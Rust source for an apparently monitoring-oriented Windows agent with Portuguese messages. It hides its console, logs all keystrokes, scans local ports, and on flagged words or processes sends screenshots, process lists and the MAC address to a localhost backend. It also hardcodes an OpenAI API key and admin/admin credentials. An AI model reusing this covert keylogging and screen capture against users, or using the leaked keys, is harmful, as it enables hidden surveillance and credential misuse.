extern crate winapi;
extern crate mac_address;
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;
use std::time::Duration;
use reqwest;
use serde::Deserialize;
use serde_json::Value;
use std::fs::File;
use serde_json::{json};
use std::collections::HashMap;
use reqwest::header::HeaderMap;
use std::ptr;
use std::mem;
use winapi::um::tlhelp32::*;
use winapi::um::handleapi::*;
use image::RgbaImage;
use win_screenshot::prelude::capture_display;
use image::{DynamicImage};
use base64::{encode};
use mac_address::get_mac_address;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt};
use tokio::runtime::Runtime;
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};
use std::io::{Read, Write};
use std::collections::HashSet;
use std::io::{self, BufRead};
use reqwest::header;
use url::form_urlencoded;
use serde_derive::Deserialize;



async fn main_async() -> Result<(), Box<dyn std::error::Error>> {
    println!("Iniciou o programa!");
    if let Err(err) = update_aux_data().await {
        eprintln!("Erro ao atualizar dados auxiliares: {:?}", err);
    }

    let scanner_handle = thread::spawn(|| {
        println!("Iniciou a thread scanner_handle");
        let rt = Runtime::new().unwrap();
        rt.block_on(process_scan_results());
    });

    let keylogger_handle = thread::spawn(|| {
        println!("Iniciou a thread keylogger_handle");
        let rt = Runtime::new().unwrap();
        rt.block_on(keylogger());
    });

    let sniffer_handle = thread::spawn(|| {
        println!("Iniciou a thread do sniffer_handle");
        let rt = Runtime::new().unwrap();
        rt.block_on(sniffer());
    });

    scanner_handle.join().unwrap();
    keylogger_handle.join().unwrap();
    sniffer_handle.join().unwrap();

    loop {
        thread::sleep(Duration::from_secs(1));
    }
}

fn main() {
    let _ = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2) // Defina o número de threads Tokio
        .enable_all() // Ative todos os recursos do Tokio
        .build()
        .unwrap()
        .block_on(main_async());
}

async fn sniffer(){
    let addresses = [
        SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 8081),
        SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 80),
        SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 443),
    ];

    for address in &addresses {
        start_server(*address);
    }
}

fn start_server(address: SocketAddrV4) {
    let listener = TcpListener::bind(address).expect("Falha ao criar o servidor");

    println!("Aguardando conexões na porta {}...", address.port());

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| {
                    let _ = handle_client(stream);
                });
            }
            Err(e) => {
                eprintln!("Erro ao aceitar conexão: {}", e);
            }
        }
    }
}

fn read_blocked_sites(filename: &str) -> io::Result<HashSet<String>> {
    let file = File::open(filename)?;
    let reader = io::BufReader::new(file);
    let blocked_sites: HashSet<String> = reader.lines().map(|line| line.unwrap()).collect();
    Ok(blocked_sites)
}

fn handle_client(mut stream: std::net::TcpStream) -> io::Result<()> {
    let blocked_sites = read_blocked_sites("C:\\keyLogger\\sites.txt")?;
    let mut logs: String = "".to_string();
    let mut buffer = [0; 1024];
    
    if let Ok(size) = stream.read(&mut buffer) {
        if let Ok(request) = String::from_utf8(buffer[..size].to_vec()) {
            if blocked_sites.contains(&request) {
                logs = format!("Alerta gerado pelo seguinte DNS: {}", request);
                send_alert(&logs);
            }
        }
    }

    let response = "HTTP/1.1 200 OK\r\n\r\nHello, World!";
    if let Err(e) = stream.write(response.as_bytes()) {
        eprintln!("Erro ao escrever resposta: {}", e);
    }
    Ok(())
}

const MAX: u16 = 9000;

async fn scan(target: &str, port: u16) -> Option<u16> {
    let addr = format!("{}:{}", target, port);
    match TcpStream::connect(&addr).await {
        Ok(mut stream) => {
            let mut buffer = vec![0; 1024];
            match banner(&mut stream, &mut buffer).await {
                Ok(banner) => {
                    if !banner.is_empty() {
                        Some(port)
                    } else {
                        None
                    }
                }
                Err(_) => None,
            }
        }
        Err(_) => None,
    }
}

async fn banner(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<String, std::io::Error> {
    let n = stream.read(buffer).await?;
    Ok(String::from_utf8_lossy(&buffer[0..n]).to_string())
}

async fn process_scan_results() {
    let vulnerability_file = std::fs::read_to_string("C:\\keyLogger\\vulnerable_banners.txt").unwrap_or_default();

    for port in 1..=MAX {
        if let Some(open_port) = scan("localhost", port).await {
            let addr = format!("localhost:{}", open_port);
            match TcpStream::connect(&addr).await {
                Ok(mut stream) => {
                    let mut buffer = vec![0; 1024];
                    if let Ok(banner) = banner(&mut stream, &mut buffer).await {
                        if vulnerability_file.contains(&banner) {
                            let log_msg = format!("[!] Vulnerability found: {} at port {}\n", banner, open_port);
                            println!("{}", log_msg);
                            send_alert(log_msg.as_str()).await;
                        }
                    }
                }
                Err(_) => {}
            }
        }
    }
}

async fn keylogger() -> ! {
    stealth();
    let mut log = String::new();

    loop {
        for i in 8..190 {
            if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
                let key: String = match i as u32 {
                    32 => " ".into(),
                    8 => "[Backspace]".into(),
                    13 => "\n".into(),
                    190 | 110 => ".".into(),
                    _ => (i as u8 as char).to_string(),
                };
                log.push_str(&key);
            }
        }

        // Verifica se a tecla Enter foi pressionada corretamente
        let enter_pressed = unsafe {
            user32::GetAsyncKeyState(13) & 0x8000u16 as i16 != 0
        };

        if enter_pressed {
            if !log.is_empty() {
                println!("{}",log);
                report(&log).await;
                log.clear();
            }
        }

        // Aguarde um curto período para evitar uso excessivo da CPU
        thread::sleep(Duration::from_millis(10));
    }
}

fn stealth() {
    unsafe {
        kernel32::AllocConsole();
        let stealth = user32::FindWindowA(
            ptr::null_mut(),
            ptr::null(),
        );
        user32::ShowWindow(stealth, 0);
    }
}

#[derive(Debug, Deserialize)]
struct Language {
    word: String,
}

#[derive(Debug, Deserialize)]
struct Port {
    vulnarableBanners: String,
}

#[derive(Debug, Deserialize)]
struct Process {
    nameExe: String,
}

#[derive(Debug, Deserialize)]
struct Website {
    url: String,
}

async fn update_aux_data() -> Result<(), Box<dyn std::error::Error>> {
    // Fazer login e obter o token
    let token = match do_login().await {
        Ok(token) => token,
        Err(err) => {
            eprintln!("Erro ao fazer login: {:?}", err);
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Falha ao fazer login.",
            )));
        }
    };

    let client = reqwest::Client::new();

    // Atualizar a lista de palavras proibidas (badLanguage)
    let bad_languages = client.get("http://localhost:9000/language?page=1&size=1000&sortBy=id")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let bad_languages_text = bad_languages.text().await?;
    let languages: Vec<Language> = serde_json::from_str(&bad_languages_text)?;

    let mut bad_language_file = tokio::fs::File::create(r"C:\keyLogger\badLanguage.txt").await?;
    for language in languages {
        tokio::io::AsyncWriteExt::write_all(&mut bad_language_file, language.word.as_bytes()).await?;
        tokio::io::AsyncWriteExt::write_all(&mut bad_language_file, ";".as_bytes()).await?;
    }

    // Atualizar a lista de banners vulneráveis (vulnerable_banners)
    let vulnerable_banners = client.get("http://localhost:9000/port?page=1&size=1000&sortBy=id")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let vulnerable_banners_text = vulnerable_banners.text().await?;
    let banners: Vec<Port> = serde_json::from_str(&vulnerable_banners_text)?;

    let mut banners_file = tokio::fs::File::create(r"C:\keyLogger\vulnerable_banners.txt").await?;
    for banner in banners {
        tokio::io::AsyncWriteExt::write_all(&mut banners_file, banner.vulnarableBanners.as_bytes()).await?;
        tokio::io::AsyncWriteExt::write_all(&mut banners_file, ";".as_bytes()).await?;
    }

    // Atualizar a lista de processos maliciosos (maliciousProcess)
    let malicious_processes = client.get("http://localhost:9000/process?page=1&size=1000&sortBy=id")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let malicious_processes_text = malicious_processes.text().await?;
    let processes: Vec<Process> = serde_json::from_str(&malicious_processes_text)?;

    let mut processes_file = tokio::fs::File::create(r"C:\keyLogger\maliciousProcess.txt").await?;
    for process in processes {
        tokio::io::AsyncWriteExt::write_all(&mut processes_file, process.nameExe.as_bytes()).await?;
        tokio::io::AsyncWriteExt::write_all(&mut processes_file, ";".as_bytes()).await?;
    }

    // Atualizar a lista de sites bloqueados (sites)
    let blocked_sites = client.get("http://localhost:9000/website?page=1&size=1000&sortBy=id")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let blocked_sites_text = blocked_sites.text().await?;
    let sites: Vec<Website> = serde_json::from_str(&blocked_sites_text)?;

    let mut sites_file = tokio::fs::File::create(r"C:\keyLogger\sites.txt").await?;
    for site in sites {
        tokio::io::AsyncWriteExt::write_all(&mut sites_file, site.url.as_bytes()).await?;
        tokio::io::AsyncWriteExt::write_all(&mut sites_file, ";".as_bytes()).await?;
    }

    Ok(())
}

async fn do_login() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let username = "admin";
    let password = "admin";

    let form_data = vec![
        ("username", username),
        ("password", password),
        ("grant_type", "password"),
    ];

    let body = form_urlencoded::Serializer::new(String::new())
        .extend_pairs(form_data)
        .finish();

    let response = client
        .post("http://localhost:8180/realms/quarkus1/protocol/openid-connect/token")
        .basic_auth("backend-service", Some("secret"))
        .header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
        .body(body)
        .send()
        .await?;

    if response.status() != reqwest::StatusCode::OK {
        let error_message = format!("Falha ao fazer login. Status: {}", response.status());
        return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_message)));
    }

    println!("{}", response.status());

    let response_text = response.text().await?;
    let response_json: Value = serde_json::from_str(&response_text)?;

    let token = response_json["access_token"].as_str()
        .ok_or_else(|| Box::new(std::io::Error::new(std::io::ErrorKind::Other, "Token não encontrado no JSON")))?
        .to_string();

    Ok(token)
}


fn get_shift_chars() -> HashMap<&'static str, char> {
    let mut shift_chars = HashMap::new();
    shift_chars.insert("Shift + 1", '!');
    shift_chars.insert("Shift + 2", '@');
    shift_chars.insert("Shift + 3", '#');
    // Adicione outros caracteres aqui, se necessário
    shift_chars
}

async fn is_hate_speech(log: &str) -> bool {
    let data_logs = json!({"valor": 0, "frase": log});
    let client = reqwest::Client::new();
    let res = client
        .post("http://localhost:5000/predict")
        .json(&data_logs)
        .send()
        .await;
    if let Ok(response) = res {
        if response.status() == reqwest::StatusCode::OK {
            let hate_speech: Vec<HashMap<String, i32>> = response.json().await.unwrap_or_default();
            println!("teste2");
            if let Some(hate_speech_json) = hate_speech.get(0) {
                if let Some(valor) = hate_speech_json.get("valor") {
                    if *valor == 1 {
                        println!("Geração de alerta por discurso de ódio: {}", log);
                        println!("{:?}", hate_speech_json);
                        return true;
                    }
                }
            }
        }
    }

    false
}


async fn verifyng_hate_speech_chatGPT(text: &str) -> bool {
    let openai_api_key = "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";
    let prompt = format!(
        r#"Identifique se essa frase tem discurso de ódio: "{}". Responda com sim ou não"#,
        text
    );
    let request_body = json!({
        "model": "text-davinci-003",
        "prompt": prompt,
        "temperature": 0.6,
    });

    let client = reqwest::Client::new();

    match client
        .post("https://api.openai.com/v1/engines/text-davinci-003/completions")
        .header("Authorization", format!("Bearer {}", openai_api_key))
        .json(&request_body)
        .send()
        .await
    {
        Ok(response) => {
            if let Ok(body) = response.json::<HashMap<String, Vec<HashMap<String, String>>>>().await {
                if let Some(choices) = body.get("choices") {
                    if !choices.is_empty() {
                        if let Some(text) = choices[0].get("text") {
                            if text.to_lowercase().starts_with("sim") {
                                println!("Geração de alerta por discurso de ódio no ChatGPT: {}", text);
                                return true;
                            }
                        }
                    }
                }
            }
        }
        Err(_) => {
            println!("ChatGPT está off!");
        }
    }

    false
}

fn is_bad_language(log: &str) -> bool {
    let log_tokenized = log.split_whitespace();
    if let Ok(file_contents) = std::fs::read_to_string(r"C:\keyLogger\badLanguage.txt") {
        let bad_words: Vec<&str> = file_contents.split(';').collect();
        for word in log_tokenized {
            if bad_words.contains(&word.to_lowercase().as_str()) {
                println!("Palavra que gerou o alerta: {}", word);
                return true;
            }
        }
    }

    false
}

fn are_malicious_process(log: &str) -> bool {
    if let Ok(file_contents) = std::fs::read_to_string(r"C:\keyLogger\maliciousProcess.txt") {
        let malicious_processes: Vec<&str> = file_contents.split(';').collect();
        for line in log.lines() {
            for proc in malicious_processes.iter() {
                if line.to_lowercase().contains(&proc.to_lowercase()) {
                    println!("Alerta gerado por causa do processo: {}", proc);
                    return true;
                }
            }
        }
    }

    false
}

fn get_mac_as_string() -> String {
    match get_mac_address() {
        Ok(Some(mac)) => mac.to_string(),
        _ => "MAC Address not found".to_string(),
    }
}

fn get_process() -> String {
    let mut process_names = Vec::new();

    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if snapshot == INVALID_HANDLE_VALUE {
        println!("Error: CreateToolhelp32Snapshot failed");
        return "".to_string();
    }

    if unsafe { Process32First(snapshot, &mut process_entry) } == 1 {
        while unsafe { Process32Next(snapshot, &mut process_entry) } == 1 {
            let process_name = unsafe {
                let mut len = 0;
                while process_entry.szExeFile[len] != 0 {
                    len += 1;
                }
                let bytes = &process_entry.szExeFile[0..len] as *const _ as *const u8;
                String::from_utf8_lossy(std::slice::from_raw_parts(bytes, len))
            };

            process_names.push(process_name.to_string());
        }
    }

    unsafe {
        CloseHandle(snapshot);
    }

    process_names.join(",")
}


fn get_image() -> String {
    let buf = capture_display().unwrap();
    let img = DynamicImage::ImageRgba8(RgbaImage::from_raw(buf.width, buf.height, buf.pixels).unwrap());

    let resized_img = img.resize(800, 600, image::imageops::FilterType::Lanczos3);

    resized_img.save("screenshot.png").unwrap();

    let mut file = File::open("screenshot.png").unwrap();
    let mut image_data = Vec::new();
    file.read_to_end(&mut image_data).unwrap();
    let encoded_image = encode(&image_data);

    encoded_image
}

async fn send_alert(log: &str) -> Result<(), Box<dyn std::error::Error>> {
    let token = do_login().await?;
    let mut headers = HeaderMap::new();
    headers.insert("Authorization", format!("Bearer {}", token).parse()?);

    let image_data = get_image();

    let client = reqwest::Client::new();
    
    // Construir o objeto ImageData na requisição.
    let image_response = client
        .post("http://localhost:9000/image")
        .headers(headers.clone())
        .json(&json!({
            "productImg": log,
            "base64Img": image_data,
        }))
        .send()
        .await?;

    let image_json: serde_json::Value = image_response.json().await?;
    let image_id = image_json.get("id").and_then(|id| id.as_i64()).unwrap_or(0);

    // Construir o objeto AlertData na requisição.
    let alert_response = client
        .post("http://localhost:9000/alert")
        .headers(headers)
        .json(&json!({
            "pcId": get_mac_as_string(),
            "image": {
                "id": image_id
            },
            "processos": get_process(),
        }))
        .send()
        .await?;

    println!("{:?}", alert_response);
    println!("Alert Saved!");
    Ok(())
}

async fn report(log: &str) -> Result<(), Box<dyn std::error::Error>> {
    if is_hate_speech(log).await || is_bad_language(log) || are_malicious_process(log) || verifyng_hate_speech_chatGPT(log).await {
        println!("Foi enviado o report!");
        send_alert(log).await?;
    }
    Ok(())
}
